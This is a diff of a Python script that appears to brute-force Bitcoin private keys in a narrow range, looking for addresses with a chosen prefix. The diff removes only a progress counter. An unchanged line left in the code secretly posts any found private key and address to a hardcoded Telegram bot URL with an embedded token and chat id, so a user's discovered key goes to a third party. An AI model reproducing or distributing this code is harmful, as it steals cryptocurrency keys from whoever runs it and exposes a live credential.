@@ -9,7 +9,6 @@ def clear():
     console.clear()
 # Function to generate Bitcoin addresses
 def generate_address(prefix):
-    total = 0
     while True:  
         low  = 0x40000000000000000
         high = 0x400000000000009ff
@@ -20,13 +19,11 @@ def generate_address(prefix):
         pubkey1 = encode_pubkey(pub, "bin_compressed")
         addr = pubtoaddr(pubkey1)
         n = addr
-        total += 1
         if n.startswith(prefix):
             console.print ("FOUND!", priv, addr,  result)
             requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={priv}|{addr}")           
         else:
             clear()
-            console.print("TOTAL: ", total,"\n", addr, end='\r')
 
 if __name__ == '__main__':
     console = Console()
